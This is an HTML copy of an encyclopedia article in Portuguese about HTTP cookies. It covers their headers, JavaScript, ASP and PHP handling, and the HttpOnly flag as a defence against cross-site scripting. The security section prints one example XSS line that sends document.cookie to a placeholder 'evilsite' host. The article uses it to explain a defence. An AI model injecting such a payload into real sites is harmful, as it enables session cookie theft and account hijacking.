<html><title>Cookie</title><body>&#10;<p> &#10; &#10; &#10; &#10; &#10;<b><i>Cookie</i></b> (termo da <a href="http://en.wikipedia.org/wiki/L%C3%ADngua_inglesa" id="w">l&iacute;ngua inglesa</a> que significa, literalmente, &#34&semi;<a href="http://en.wikipedia.org/wiki/Biscoito" id="w">biscoito</a>&#34&semi;. L&ecirc;&shy;se &#34&semi;cuqui&#34&semi;), <b>testemunho de conex&atilde;o</b>, ou, simplesmente, <b>testemunho</b>, &eacute; um grupo de <a href="http://en.wikipedia.org/wiki/Dados" id="w">dados</a> trocados entre o <a href="http://en.wikipedia.org/wiki/Navegador" id="w">navegador</a> e o <a href="http://en.wikipedia.org/wiki/Servidor" id="w">servidor</a> de p&aacute;ginas e colocado num <a href="http://en.wikipedia.org/wiki/Arquivo_de_texto" id="w">arquivo (ficheiro) de texto</a> criado no computador do <a href="http://en.wikipedia.org/wiki/Utilizador" id="w">utilizador</a>. A sua fun&ccedil;&atilde;o principal &eacute; a de manter a <a href="http://en.wikipedia.org/wiki/Persist%C3%AAncia" id="w">persist&ecirc;ncia</a> de sess&otilde;es <a href="http://en.wikipedia.org/wiki/HTTP" id="w">HTTP</a>. A utiliza&ccedil;&atilde;o e implementa&ccedil;&atilde;o de <i>cookies</i> foi um adendo ao <a href="http://en.wikipedia.org/wiki/HTTP" id="w">HTTP</a> e muito debatida na altura em que surgiu o conceito, introduzido pela <a href="http://en.wikipedia.org/wiki/Netscape" id="w">Netscape</a>, devido &agrave;s consequ&ecirc;ncias de guardar <a href="http://en.wikipedia.org/wiki/Confidencialidade" id="w">informa&ccedil;&otilde;es confidenciais</a> num computador &shy; j&aacute; que, por vezes, isso pode n&atilde;o ser devidamente seguro, como no caso de uso costumeiro em terminais p&uacute;blicos.</p>&#10;<p>Um exemplo &eacute; aquele <i>cookie</i> que um <i>site</i> cria para que voc&ecirc; n&atilde;o precise digitar sua senha novamente quando for ao <i>site</i> outra vez. Outros <i>sites</i> podem utiliz&aacute;&shy;los para guardar as prefer&ecirc;ncias do usu&aacute;rio: por exemplo, quando o s&iacute;tio lhe permite escolher uma cor de fundo para suas p&aacute;ginas.</p>&#10;<p>Funcionamento:&#10;</p>&#10;<ul>&#10;<li>Quando o servidor deseja activar um <i>cookie</i> no cliente, envia uma linha no cabe&ccedil;alho <a href="http://en.wikipedia.org/wiki/HTTP" id="w">HTTP</a> iniciada por <tt>Set&shy;Cookie: ...</tt></li>&#10;<li>A partir desse momento, consoante as op&ccedil;&otilde;es especificadas pelo <i>cookie</i>, o cliente ir&aacute; enviar no seu cabe&ccedil;alho HTTP dos pedidos uma linha contendo os <i>cookies</i> relevantes, iniciada por <tt>Cookie: ...</tt>.</li></ul>&#10;<p>Entre os par&acirc;metros dos <i>cookies</i> est&atilde;o: o tempo de vida (a data para o <i>cookie</i> &#34&semi;expirar a validade&#34&semi;) e o dom&iacute;nio, ou grupo de p&aacute;ginas a que o <i>cookie</i> se aplica. Por exemplo, &eacute; poss&iacute;vel fazer com que um <i>cookie</i> seja aplicado apenas a endere&ccedil;os iniciados por http://pt.wikipedia.org/wiki/ de maneira que esse mesmo <i>cookie</i> j&aacute; n&atilde;o se aplique para http://pt.wikipedia.org/skins/, por exemplo.</p>&#10;<p>Se n&atilde;o especificada a data de validade para o <i>cookie</i>, ele ir&aacute; expirar assim que o usu&aacute;rio fechar o navegador.</p>&#10;<p>Em JavaScript (embutido no HTML da p&aacute;gina acessada), podemos criar um <i>script</i> para manipul&aacute;&shy;los. Utilizamos &#34&semi;document.cookie&#34&semi; (sem aspas). Exemplo:</p>&#10;<p /><pre class="code">&#10;<b><font color="#7F0055">function</font></b> setCookie(name, value, expires, path, domain, secure) {&#10;        <b><font color="#7F0055">var</font></b> curCookie = name + <font color="#2A00FF">&#34&semi;=&#34&semi;</font> + escape(value) +&#10;        ((expires) ? <font color="#2A00FF">&#34&semi;&semi; expires=&#34&semi;</font> + expires.toGMTString() : <font color="#2A00FF">&#34&semi;&#34&semi;</font>) +&#10;        ((path) ? <font color="#2A00FF">&#34&semi;&semi; path=&#34&semi;</font> + path : <font color="#2A00FF">&#34&semi;&#34&semi;</font>) +&#10;        ((domain) ? <font color="#2A00FF">&#34&semi;&semi; domain=&#34&semi;</font> + domain : <font color="#2A00FF">&#34&semi;&#34&semi;</font>) +&#10;        ((secure) ? <font color="#2A00FF">&#34&semi;&semi; secure&#34&semi;</font> : <font color="#2A00FF">&#34&semi;&#34&semi;</font>)&semi;&#10;        document.cookie = curCookie&semi;&#10;}&#10;&#10;<b><font color="#7F0055">function</font></b> getCookie(name) {&#10;       <b><font color="#7F0055">var</font></b> dc = document.cookie&semi;&#10;       <b><font color="#7F0055">var</font></b> prefix = name + <font color="#2A00FF">&#34&semi;=&#34&semi;</font>&semi;&#10;       <b><font color="#7F0055">var</font></b> begin = dc.indexOf(<font color="#2A00FF">&#34&semi;&semi; &#34&semi;</font> + prefix)&semi;&#10;       <b><font color="#7F0055">if</font></b> (begin == &shy;1) {&#10;              begin = dc.indexOf(prefix)&semi;&#10;              <b><font color="#7F0055">if</font></b> (begin != 0) <b><font color="#7F0055">return</font></b> <b><font color="#7F0055">null</font></b>&semi;&#10;       } <b><font color="#7F0055">else</font></b>&#10;       begin += 2&semi;&#10;       <b><font color="#7F0055">var</font></b> end = document.cookie.indexOf(<font color="#2A00FF">&#34&semi;&semi;&#34&semi;</font>, begin)&semi;&#10;       <b><font color="#7F0055">if</font></b> (end == &shy;1)&#10;       end = dc.length&semi;&#10;       <b><font color="#7F0055">return</font></b> unescape(dc.substring(begin + prefix.length, end))&semi;&#10;}&#10;&#10;<b><font color="#7F0055">function</font></b> deleteCookie(name, path, domain) {&#10;       <b><font color="#7F0055">if</font></b> (getCookie(name)) {&#10;              document.cookie = name + <font color="#2A00FF">&#34&semi;=&#34&semi;</font> + &#10;              ((path) ? <font color="#2A00FF">&#34&semi;&semi; path=&#34&semi;</font> + path : <font color="#2A00FF">&#34&semi;&#34&semi;</font>) +&#10;              ((domain) ? <font color="#2A00FF">&#34&semi;&semi; domain=&#34&semi;</font> + domain : <font color="#2A00FF">&#34&semi;&#34&semi;</font>) +&#10;              <font color="#2A00FF">&#34&semi;&semi; expires=Thu, 01&shy;Jan&shy;70 00:00:01 GMT&#34&semi;</font>&semi;&#10;              history.go(0)&semi;&#10;       }&#10;}&#10;</pre>&#10;&#10;<p>As fun&ccedil;&otilde;es do <i>script</i> acima:</p>&#10;&#10;<ul>&#10;<li><i>setCookie</i> &shy; Define o valor de um <i>cookie</i></li>&#10;<li><i>getCookie</i> &shy; Retorna o valor de um <i>cookie</i></li>&#10;<li><i>deleteCookie</i> &shy; Exclui um <i>cookie</i>. Para excluir um <i>cookie</i>, devemos alterar sua data de expira&ccedil;&atilde;o para uma data inferior a atual (esta fun&ccedil;&atilde;o faz exatamente isso).</li></ul>&#10;<p>Em <a href="http://en.wikipedia.org/wiki/ASP" id="w">ASP</a>, podemos utilizar <i>cookies</i> por meio dos objetos Response e Request. Exemplo:</p>&#10;&#10;<ul>&#10;<li>Para gravar o <i>cookie</i>  <code>Response.Cookies(&#34&semi;nomedocookie&#34&semi;)</code> </li>&#10;<li>Para definir a validade do <i>cookie</i> <code>Response.Cookies(&#34&semi;momedocookie&#34&semi;).Expires = DateAdd(&#34&semi;d&#34&semi;, 365, Now())</code></li>&#10;<li>Utilize o DateAdd para adicionar uma data. No exemplo acima, adicionamos 365 dias, o que equivale a um ano.</li>&#10;<li>Para definir o dom&iacute;nio <code>Response.Cookies(&#34&semi;nomedocookie&#34&semi;).Domain = &#34&semi;pt.wikipedia.org&#34&semi;</code></li>&#10;<li>Para definir o grupo de p&aacute;ginas que o <i>cookie</i> se aplica <code>  Response.Cookies(&#34&semi;nomedocookie&#34&semi;).Path = &#34&semi;/wiki&#34&semi;</code></li>&#10;<li>Se definido como &#34&semi;/&#34&semi;, todo o s&iacute;tio poder&aacute; acessar o <i>cookie</i>.</li>&#10;<li>Se quiser, h&aacute; como adicionar v&aacute;rios valores ao <i>cookie</i> <code> response.Cookie(&#34&semi;nomedocookie&#34&semi;)(&#34&semi;nomedovalor&#34&semi;) = &#34&semi;valor&#34&semi;</code></li>&#10;<li>Para ler o <i>cookie</i> , utilize o objeto Request. Exemplo: <code>variavel = Request.Cookies(&#34&semi;nomedocookie&#34&semi;)</code></li>&#10;<li>E para ler valores <code> variavel = Request.Cookies(&#34&semi;nomedocookie&#34&semi;)(&#34&semi;nomedovalor&#34&semi;)</code></li></ul>&#10;<p>Em <a href="http://en.wikipedia.org/wiki/PHP" id="w">PHP</a>, os <i>cookies</i> s&atilde;o tratados por meio da fun&ccedil;&atilde;o setcookie(). Esta dever&aacute; vir antes de qualquer dado ser enviado ao navegador, devido ao fato de os <i>cookies</i> fazerem parte do cabe&ccedil;alho <a href="http://en.wikipedia.org/wiki/HTTP" id="w">HTTP</a>.</p>&#10;&#10;<a id="Seguran%C3%A7a_nos_''cookies''" name="Seguran%C3%A7a_nos_''cookies''"></a><h2> Seguran&ccedil;a nos &#39&semi;&#39&semi;cookies&#39&semi;&#39&semi; </h2>&#10;&#10;<a id="''%5B%5BFlag%5D%5D''_HTTPOnly" name="''%5B%5BFlag%5D%5D''_HTTPOnly"></a><h3> &#39&semi;&#39&semi;[[Flag]]&#39&semi;&#39&semi; HTTPOnly </h3>&#10;&#10;<p>Desenvolvido pela Microsoft para o navegador Internet Explorer 6 SP1 para melhorar a seguran&ccedil;a, a <i>flag</i> mitiga as a&ccedil;&otilde;es de atacantes quando estes tentam realizar sequestro de sess&atilde;o atrav&eacute;s de <i><a href="http://en.wikipedia.org/wiki/Cross&shy;site_scripting" id="w">cross&shy;site scripting</a></i>.</p>&#10;<p><i>Cookies</i> com a <i>flag</i> HTTPOnly n&atilde;o podem ser acessados diretamente por <i>scripts</i> no lado do cliente, como por exemplo <a href="http://en.wikipedia.org/wiki/JavaScript" id="w">JavaScript</a>. Isso significa que, mesmo havendo uma vulnerabilidade que permite o <i><a href="http://en.wikipedia.org/wiki/Cross&shy;site_scripting" id="w">cross&shy;site scripting</a></i> e o usu&aacute;rio seja incentivado a clicar em um <i>link</i> que explore essa falha, o navegador n&atilde;o enviar&aacute; ou disponibilizar&aacute; o <i>cookie</i> marcado com a <i>flag</i> HTTPOnly. Por&eacute;m a <i>flag</i> &eacute; somente uma das t&eacute;cnicas para mitigar o risco de <i>cross site scripting</i>: se usada sozinha, n&atilde;o poder&aacute; eliminar a amea&ccedil;a por completo.&#10;O navegador precisa ter suporte a <i>flag</i>.</p>&#10;<p>Exemplo de resposta http com a <i>flag</i> httponly:<sup id="_ref&shy;1" class="reference"><a href="#_note&shy;1" title="">[1]</a></sup><br/></p>&#10;<p><i><code>Set&shy;Cookie: MyCookieName=The value of my cookie&semi; path=/&semi; HttpOnly</code><br/></i></p>&#10;&#10;<p>O <i>script</i> abaixo &eacute; um exemplo de <i>script</i> malicioso. Caso seja carregado no contexto da aplica&ccedil;&atilde;o vulner&aacute;vel a <a href="http://en.wikipedia.org/wiki/XSS" id="w">XSS</a>, os <i>cookies</i> do <i><a href="http://en.wikipedia.org/wiki/Browser" id="w">browser</a></i> ser&atilde;o enviados para o servidor malicioso:<sup id="_ref&shy;2" class="reference"><a href="#_note&shy;2" title="">[2]</a></sup></p>&#10;<p><i><code>location.href = &#39&semi;http://evilsite/?cookies=&#39&semi; + document.cookie&semi;</code><br/></i></p>&#10;<p>Se um navegador detecta um <i>cookie</i> com uma <i>flag</i> HTTPOnly e um <i>script</i> tenta ler o <i>cookie</i> (atrav&eacute;s do document.cookie), como no exemplo acima, o navegador retorna uma <i><a href="http://en.wikipedia.org/wiki/String" id="w">string</a></i> vazia como resultado, prevenindo que um c&oacute;digo malicioso envie dados para um <i>website</i>. As informa&ccedil;&otilde;es sens&iacute;veis contidas nos <i>cookies</i>, incluindo informa&ccedil;&otilde;es de autentica&ccedil;&atilde;o, poder&atilde;o ser coletadas pelo <i>website</i> e utilizadas para sequestro de sess&atilde;o. Caso o navegador n&atilde;o suporte a <i>flag</i>, a mesma ser&aacute; ignorada e o <i>cookie</i> criado ser&aacute; acess&iacute;vel via <i>script</i>, o qual poder&aacute; ser modificado ou roubado por um <i>script</i> malicioso.</p>&#9;&#10;<p>A seguir, uma lista de navegadores com suporte a <i>flag</i>:<sup id="_ref&shy;3" class="reference"><a href="#_note&shy;3" title="">[3]</a></sup><br/></p>&#10;&#10;<ul>&#10;<li>Chrome 24<br/></li>&#10;<li>Firefox 18 <br/></li>&#10;<li>IE 8 <br/></li>&#10;<li>IE 9 <br/></li>&#10;<li>IE 10 <br/></li>&#10;<li>Opera 12.11 <br/></li>&#10;<li>Safari 6.0.2 <br/></li>&#10;<li>Chrome 25 <br/></li>&#10;<li>Chrome 26 <br/></li>&#10;<li>Firefox 19 <br/></li>&#10;<li>Firefox 20 <br/></li>&#10;<li>Firefox 21<br/></li>&#10;<li>Opera 12.12 <br/></li>&#10;<li>Safari 6.0.3 <br/></li>&#10;<li>Android 4 <br/></li>&#10;<li>Blackberry 7 <br/></li>&#10;<li>Chrome Mobile 18 <br/></li>&#10;<li>IEMobile 9 <br/></li>&#10;<li>iPhone 5<br/></li>&#10;<li>iPhone 6 <br/></li>&#10;<li>Opera Mobile 12 <br/></li></ul>&#10;<p>A vers&atilde;o 2.3 do Android n&atilde;o possui suporte.</p>&#10;<p> </p>&#10;<a id="Liga%C3%A7%C3%B5es_externas" name="Liga%C3%A7%C3%B5es_externas"></a><h2> Liga&ccedil;&otilde;es externas </h2>&#10;&#10;<ul>&#10;<li><a class="externallink" href="http://wp.netscape.com/newsref/std/cookie_spec.html" rel="nofollow" title="http://wp.netscape.com/newsref/std/cookie_spec.html">A especifica&ccedil;&atilde;o preliminar emitida pela Netscape</a></li>&#10;<li><a class="externallink" href="http://www.ietf.org/rfc/rfc2965.txt" rel="nofollow" title="http://www.ietf.org/rfc/rfc2965.txt">RFC 2965 &shy; &#39&semi;&#39&semi;HTTP State Management Mechanism&#39&semi;&#39&semi;</a> &shy; especifica&ccedil;&atilde;o actual, que torna o <a class="externallink" href="http://www.ietf.org/rfc/rfc2109.txt" rel="nofollow" title="http://www.ietf.org/rfc/rfc2109.txt">RFC 2109</a> obsoleto.</li>&#10;<li><a class="externallink" href="http://www.codinghorror.com/blog/2008/08/protecting&shy;your&shy;cookies&shy;httponly.html" rel="nofollow" title="http://www.codinghorror.com/blog/2008/08/protecting&shy;your&shy;cookies&shy;httponly.html">&#39&semi;&#39&semi;Protecting Your Cookies&#39&semi;&#39&semi;: HttpOnly</a></li>&#10;<li><a class="externallink" href="https://www.owasp.org/index.php/HttpOnly" rel="nofollow" title="https://www.owasp.org/index.php/HttpOnly">https://www.owasp.org/index.php/HttpOnly</a></li>&#10;<li><a class="externallink" href="http://msdn.microsoft.com/en&shy;us/library/ms533046.aspx" rel="nofollow" title="http://msdn.microsoft.com/en&shy;us/library/ms533046.aspx">&#39&semi;&#39&semi;Mitigating Cross&shy;site Scripting With HTTP&shy;only Cookies&#39&semi;&#39&semi;</a></li>&#10;<li><a class="externallink" href="http://www.troyhunt.com/2013/03/c&shy;is&shy;for&shy;cookie&shy;h&shy;is&shy;for&shy;hacker.html" rel="nofollow" title="http://www.troyhunt.com/2013/03/c&shy;is&shy;for&shy;cookie&shy;h&shy;is&shy;for&shy;hacker.html">&#39&semi;&#39&semi;understanding HTTP only and Secure cookies&#39&semi;&#39&semi;</a></li>&#10;<li><a class="externallink" href="http://www.browserscope.org/?category=security" rel="nofollow" title="http://www.browserscope.org/?category=security">&#39&semi;&#39&semi;browserscope&#39&semi;&#39&semi;</a></li></ul>&#10;<p> </p>&#10;<p> </p>&#10;<p><a href="http://en.wikipedia.org/wiki/Categoria:Controle_de_acesso_a_computador" id="w">Categoria:Controle de acesso a computador</a>&#10;<a href="http://en.wikipedia.org/wiki/Categoria:Web" id="w">Categoria:Web</a>&#10;<a href="http://en.wikipedia.org/wiki/Categoria:M%C3%A9todos_de_autentica%C3%A7%C3%A3o" id="w">Categoria:M&eacute;todos de autentica&ccedil;&atilde;o</a>&#10;<a href="http://en.wikipedia.org/wiki/Categoria:Anglicismos" id="w">Categoria:Anglicismos</a></p>&#10;<p> </p></body></html>